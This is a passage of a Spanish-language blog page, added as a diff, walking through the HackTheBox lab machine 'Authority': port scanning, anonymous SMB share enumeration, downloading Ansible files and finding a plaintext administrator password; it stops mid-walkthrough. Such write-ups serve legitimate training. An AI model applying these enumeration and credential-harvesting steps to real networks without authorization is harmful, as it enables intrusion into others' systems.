@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Authority (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Authority (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-10T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Authority (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-07-10T00:00:00-06:00","datePublished":"2024-07-10T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Authority (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Authority (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-07-10T00:00:00-06:00" itemprop="datePublished">
+        Jul 10, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png" />
+</p>
+
+<ul>
+  <li>Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49692,49693,49699,49700,49716,59430 10.10.11.222 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-10 17:03 CST
+Nmap scan report <span class="k">for </span>10.10.11.222
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-11 03:03:43Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-07-11T03:04:55+00:00<span class="p">;</span> +3h59m39s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-07-11T03:04:53+00:00<span class="p">;</span> +3h59m40s from scanner time.
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+8443/tcp  open  ssl/https-alt
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>172.16.2.118
+| Not valid before: 2024-07-09T02:50:28
+|_Not valid after:  2026-07-11T14:28:52
+|_http-title: Site doesn<span class="s1">'t have a title (text/html;charset=ISO-8859-1).
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 200
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Thu, 11 Jul 2024 03:03:52 GMT
+|     Connection: close
+|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
+|   GetRequest:
+|     HTTP/1.1 200
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Thu, 11 Jul 2024 03:03:50 GMT
+|     Connection: close
+|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='</span>/pwm<span class="s1">'"/&gt;&lt;/head&gt;&lt;/html&gt;
+|   HTTPOptions:
+|     HTTP/1.1 200
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Thu, 11 Jul 2024 03:03:50 GMT
+|     Connection: close
+|   RTSPRequest:
+|     HTTP/1.1 400
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Thu, 11 Jul 2024 03:03:58 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
+|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
+|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+|_ssl-date: TLS randomness does not represent time
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49691/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49700/tcp open  msrpc         Microsoft Windows RPC
+49716/tcp open  msrpc         Microsoft Windows RPC
+59430/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/10%Time=668F136A%P=x86_64-pc-linux
+SF:-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/htm
+SF:l;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2011\x2
+SF:0Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n
+SF:\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='</span>/pwm<span class="s1">'
+SF:\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x
+SF:20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
+SF:0Thu,\x2011\x20Jul\x202024\x2003:03:50\x20GMT\r\nConnection:\x20close\r
+SF:\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\
+SF:x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Th
+SF:u,\x2011\x20Jul\x202024\x2003:03:52\x20GMT\r\nConnection:\x20close\r\n\
+SF:r\n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0
+SF:;URL='</span>/pwm<span class="s1">'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20
+SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
+SF:\r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2011\x20Jul\x202024\x2003
+SF::03:58\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x2
+SF:0lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
+SF:x20Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20{font-family:Taho
+SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
+SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
+SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
+SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
+SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
+SF:20Request&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x2
+SF:0Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20
+SF:the\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;
+SF:p&gt;&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x2
+SF:0process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20p
+SF:erceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\
+SF:x20request\x20syntax,\x20invalid\x20");
+Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 3h59m39s, deviation: 0s, median: 3h59m38s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-07-11T03:04:43
+|_  start_date: N/A
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Vamos a comenzar enumerando la máquina ya que tiene muchos puertos abiertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme ldap 10.10.11.222
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.222 authority.htb authority.htb.corp DC.authority.htb dc.authority.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+authority.htb authority.htb.corp DC.authority.htb dc.authority.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Si enumeramos recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> vemos los siguientes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.222
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	Department Shares Disk
+	Development     Disk
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.11.222 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Si analizamos el contenido de <code class="language-plaintext highlighter-rouge">Department Shares</code> vemos que no tenemos acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.11.222 <span class="nt">-u</span> <span class="s1">'xd'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Department Shares'</span> <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.10.11.222:445	Name: 10.10.11.222        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	Department Shares                                 	NO ACCESS	
+	Development                                       	READ ONLY	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share
+	SYSVOL                                            	NO ACCESS	Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Sin embargo en el recurso <code class="language-plaintext highlighter-rouge">Development</code> si tenemos permisos de lectura.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.222/Development <span class="nt">-U</span> xd%xd
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:38 2023
+  ..                                  D        0  Fri Mar 17 07:20:38 2023
+  Automation                          D        0  Fri Mar 17 07:20:40 2023
+
+		5888511 blocks of size 4096. 1132344 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Automation
+smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:40 2023
+  ..                                  D        0  Fri Mar 17 07:20:40 2023
+  Ansible                             D        0  Fri Mar 17 07:20:50 2023
+
+		5888511 blocks of size 4096. 1129444 blocks available
+smb: <span class="se">\A</span>utomation<span class="se">\&gt;</span> <span class="nb">cd </span>Ansible
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:50 2023
+  ..                                  D        0  Fri Mar 17 07:20:50 2023
+  ADCS                                D        0  Fri Mar 17 07:20:48 2023
+  LDAP                                D        0  Fri Mar 17 07:20:48 2023
+  PWM                                 D        0  Fri Mar 17 07:20:48 2023
+  SHARE                               D        0  Fri Mar 17 07:20:48 2023
+
+		5888511 blocks of size 4096. 1185756 blocks available
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Dentro de Share encontramos otro recurso que se llama <code class="language-plaintext highlighter-rouge">tasks</code> donde encontramos un <code class="language-plaintext highlighter-rouge">.yml</code> vamos a descargarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\&gt;</span> <span class="nb">cd </span>tasks<span class="se">\</span>
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
+  ..                                  D        0  Fri Mar 17 07:20:48 2023
+  main.yml                            A     1876  Thu Sep 22 01:04:00 2022
+
+		5888511 blocks of size 4096. 1254895 blocks available
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span> get main.yml
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1876 as main.yml <span class="o">(</span>2.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.1 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\S</span>hare<span class="se">\t</span>asks<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el contenido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>main.yml
+    - name: Make subdirectories under Share
+      ansible.windows.win_file:
+        path: <span class="s2">""</span>
+        state: directory
+      loop:
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\I</span>T<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\H</span>R<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\R</span>&amp;D<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\M</span>arketing<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\F</span>inance<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\E</span>xecutives<span class="se">\P</span>rivate
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>ublic
+        - C:<span class="se">\S</span>hare<span class="se">\I</span>nternal<span class="se">\A</span>ccounting<span class="se">\P</span>rivate
+
+    - name: Make user folders <span class="k">for </span>all <span class="nb">users
+      </span>ansible.windows.win_powershell:
+        script: |
+          <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"C:</span><span class="se">\S</span><span class="s2">hare</span><span class="se">\"</span><span class="s2">
+          </span><span class="nv">$users</span><span class="s2"> = (Get-ADUser -Filter * ).Name
+          foreach (</span><span class="nv">$user</span><span class="s2"> in </span><span class="nv">$users</span><span class="s2">) {
+            New-Item -ItemType Directory -Force -Path </span><span class="nv">$path</span><span class="se">\$</span><span class="s2">user}
+
+    - name: Create User Share
+      win_share:
+          name: ''
+          description: ''
+          path: ''
+          list: ''
+          full: ''
+          read: ''
+      with_items:
+        - {path: 'C:</span><span class="se">\S</span><span class="s2">hare', share_name: 'User Share', share_description: 'Share for Users', full: 'Administrators, Domain Users', read: 'Domain Users', list: no }
+
+    - name: Enable inherited ACL
+      ansible.windows.win_acl_inheritance:
+        path: C:</span><span class="se">\S</span><span class="s2">hare
+        state: present
+
+    - name: ACL
+      ansible.windows.win_acl:
+        path: C:</span><span class="se">\S</span><span class="s2">hare
+        user: Administrator, Domain Users
+        rights: Full Control
+        type: 'Allow'
+        inherit:  None
+        propagation: 'None'
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>El script de Ansible main.yml está diseñado para automatizar la creación de una estructura de carpetas para distintos departamentos y usuarios en un servidor Windows, así como para configurar los permisos de acceso y compartir el directorio principal C:\Share con los usuarios del dominio y administradores.</p>
+</blockquote>
+
+<ul>
+  <li>Dentro de <code class="language-plaintext highlighter-rouge">pwn</code> hay varios archivos interesantes donde mencionan mucho ansible vamos a descargarlos para analizarlos mejor en nuestra máquina de atacante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 17 07:20:48 2023
+  ..                                  D        0  Fri Mar 17 07:20:48 2023
+  ansible.cfg                         A      491  Thu Sep 22 00:36:58 2022
+  ansible_inventory                   A      174  Wed Sep 21 17:19:32 2022
+  defaults                            D        0  Fri Mar 17 07:20:48 2023
+  handlers                            D        0  Fri Mar 17 07:20:48 2023
+  meta                                D        0  Fri Mar 17 07:20:48 2023
+  README.md                           A     1290  Thu Sep 22 00:35:58 2022
+  tasks                               D        0  Fri Mar 17 07:20:48 2023
+  templates                           D        0  Fri Mar 17 07:20:48 2023
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> prompt off
+smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> recurse <span class="nb">true
+</span>smb: <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\&gt;</span> mget PWM
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible.cfg of size 491 as PWM/ansible.cfg <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.5 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\a</span>nsible_inventory of size 174 as PWM/ansible_inventory <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\R</span>EADME.md of size 1290 as PWM/README.md <span class="o">(</span>1.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\d</span>efaults<span class="se">\m</span>ain.yml of size 1591 as PWM/defaults/main.yml <span class="o">(</span>1.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.0 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\h</span>andlers<span class="se">\m</span>ain.yml of size 4 as PWM/handlers/main.yml <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\m</span>eta<span class="se">\m</span>ain.yml of size 199 as PWM/meta/main.yml <span class="o">(</span>0.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>asks<span class="se">\m</span>ain.yml of size 1832 as PWM/tasks/main.yml <span class="o">(</span>1.8 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\c</span>ontext.xml.j2 of size 422 as PWM/templates/context.xml.j2 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\P</span>WM<span class="se">\t</span>emplates<span class="se">\t</span>omcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 <span class="o">(</span>0.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.8 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Encontramos credenciales <a href="https://www.redhat.com/es/topics/automation/learning-ansible-tutorial">https://www.redhat.com/es/topics/automation/learning-ansible-tutorial</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ansible_inventory
+ansible_user: administrator
+ansible_password: Welcome1
+ansible_port: 5985
+ansible_connection: winrm
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore
+</code></pre></div></div>
+
+<ul>
